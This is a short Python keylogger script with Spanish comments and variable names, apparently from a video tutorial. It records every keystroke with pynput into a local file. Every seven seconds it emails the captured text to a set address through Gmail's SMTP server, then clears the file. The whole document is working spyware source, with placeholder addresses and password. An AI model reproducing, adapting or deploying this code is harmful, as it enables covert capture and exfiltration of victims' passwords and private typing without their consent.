import os
import logging
import smtplib
import time
import datetime
import threading

from pynput.keyboard import Key, Listener

carpeta_destino = '/ruta/a/tu/carpeta/KeyloggerYT.txt'
segundos_espera = 7

timeout = time.time() + segundos_espera

def TimeOut():
    return time.time() > timeout

def EnviarEmail():
    global timeout
    with open(carpeta_destino, 'r') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = data.replace('Space', ' ')
        data = data.replace('\n', '\n\n')
        data = 'Mensaje capturado a las: ' + fecha + '\n' + data
        print(data)

        crearEmail('tudireccion@gmail.com', 'tucontraseña', 'destinatario@gmail.com', "Nueva captura:" + fecha, data)
        f.seek(0)
        f.truncate()
    timeout = time.time() + segundos_espera

def crearEmail(user, passw, recep, subj, body):
    mailuser = user
    mailPass = passw
    From = user
    To = [recep]
    Subject = subj
    Txt = body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(mailuser, mailPass)
        server.sendmail(From, To, email)
        server.quit()
        print('Correo enviado con éxito!!')
    except Exception as e:
        print('Correo fallido :(', e)

def on_press(key):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format="%(message)s")

    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        return False

# Inicia el proceso de escucha del teclado en un hilo separado
with Listener(on_press=on_press, on_release=on_release) as listener_thread:
    while True:
        if TimeOut():
            EnviarEmail()
